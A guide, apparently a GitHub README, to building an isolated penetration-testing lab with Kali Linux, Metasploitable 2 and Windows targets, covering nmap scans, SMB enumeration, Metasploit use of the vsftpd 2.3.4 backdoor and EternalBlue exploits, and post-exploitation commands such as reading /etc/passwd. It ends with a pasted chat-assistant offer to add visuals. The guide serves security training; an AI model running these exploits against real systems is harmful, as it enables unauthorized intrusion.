# 🛡️ A Detailed guide to setting up a safe and Real world penetration testing lab.

<p align="center">
  <img src="https://img.shields.io/badge/Lab-Environment-blue?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Tools-Kali%20Linux-green?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Targets-Metasploitable%20%26%20Windows-red?style=for-the-badge" />
</p>


## 🔹 Lab Overview

This guide is designed for **ethical hackers and cybersecurity enthusiasts** to practice penetration testing in a **safe, isolated, and realistic environment**.

**Lab Components:**

| Machine   | OS               | IP Address       | Role                         |
|-----------|-----------------|----------------|------------------------------|
| Attacker  | Kali Linux       | 192.168.142.128 | Pentester machine            |
| Target 1 | Metasploitable 2 | 192.168.142.130 | Vulnerable Linux machine     |
| Target 2 | Windows 10/Server| 192.168.142.132 | Vulnerable Windows machine   |

**Objectives:**  
- Perform reconnaissance, scanning, enumeration, exploitation, and post-exploitation.
- Practice both Linux and Windows target exploitation in a controlled environment.
- Build a detailed report of findings.

## 🔹 Lab Setup

### 1. Requirements
- Virtualization software: **VirtualBox** or **VMware**
- Kali Linux VM
- Metasploitable 2 VM
- Windows VM (10/Server)
- Internal network setup for isolation
- Snapshots before testing

### 2. Network Configuration
1. Set all VMs to **Host-Only Adapter** or **Internal Network**.
2. Confirm connectivity between machines:
```bash
ping 192.168.142.130
ping 192.168.142.132
````

---

## 🔹 Step-by-Step Penetration Testing

### Step 1: Reconnaissance

#### Passive Recon

* Gather info without directly contacting the target:

```bash
whois 192.168.142.130
whois 192.168.142.132
nslookup 192.168.142.132
```

#### Active Recon

* Scan for open ports and services with **Nmap**:

```bash
nmap -sS -Pn 192.168.142.130
nmap -sS -Pn 192.168.142.132
```

* Detailed scanning with service detection:

```bash
nmap -A -p- 192.168.142.130
nmap -A -p- 192.168.142.132
```

---

### Step 2: Enumeration

#### Linux Target

* Identify services and versions:

```bash
nmap -sV -p 21,22,23,80,139,445,3306 192.168.142.130
```

* FTP Banner grabbing:

```bash
nc 192.168.142.130 21
```

* SMB enumeration:

```bash
smbclient -L \\192.168.142.130 -U guest
enum4linux 192.168.142.130
```

#### Windows Target

* SMB enumeration:

```bash
smbclient -L \\192.168.142.132 -U Administrator
```

* RDP/SMB service detection:

```bash
nmap -p 3389,445 -sV 192.168.142.132
```

---

### Step 3: Vulnerability Analysis

* Use **Searchsploit** to find known exploits:

```bash
searchsploit vsftpd 2.3.4
searchsploit ms17-010
```

* Metasploit module usage example:

```bash
msfconsole
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.142.132
run
```

---

### Step 4: Exploitation

#### Linux Target

* Exploit FTP vulnerability:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.142.130
run
```

#### Windows Target

* Exploit SMB vulnerability:

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.142.132
run
```

* Gain shell access:

```bash
whoami
id
```

---

### Step 5: Post-Exploitation

* Linux target:

```bash
uname -a
cat /etc/passwd
ifconfig
sudo -l
```

* Windows target:

```powershell
systeminfo
net user
whoami /priv
```

* Extract sensitive information or pivot to other machines (in lab only).

---

### Step 6: Reporting

Document all findings with screenshots, PoCs, and mitigation steps.

**Sample Table:**

| Vulnerability | Exploit Used  | Impact                | Mitigation                      |
| ------------- | ------------- | --------------------- | ------------------------------- |
| FTP Backdoor  | vsftpd\_2.3.4 | Remote Shell Access   | Upgrade FTP / Disable anonymous |
| SMB MS17-010  | EternalBlue   | Remote Code Execution | Apply Windows Update / Patch    |

---

## 🔹 Recommended Tools

* **Kali Linux Tools:** Nmap, Netcat, Metasploit, Enum4linux, Nikto, Dirb
* **Windows Testing Tools:** PowerShell, CrackMapExec, SMBMap
* **Analysis Tools:** Wireshark, Burp Suite

---

## 🔹 Best Practices

* Always take VM snapshots before testing.
* Keep the lab **isolated from the internet**.
* Use only lab IP addresses to avoid accidental attacks.
* Document every step carefully for reporting.

---

## 🔹 References

* [Metasploitable 2 VM](https://sourceforge.net/projects/metasploitable/)
* [Kali Linux Tools](https://www.kali.org/tools/)
* [MS17-010 EternalBlue](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
* [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

> ⚠️ **Disclaimer:**
> This lab is for **educational purposes only**. Do **NOT** perform penetration testing on unauthorized networks. Unauthorized testing is illegal and unethical.

```

---

If you want, I can also **add rich visuals, diagrams, folder structures, and GitHub badges for tools, OS, and steps**—so it becomes a **full professional lab README.md** ready to impress on GitHub.  

Do you want me to enhance it with visuals and structure?
```
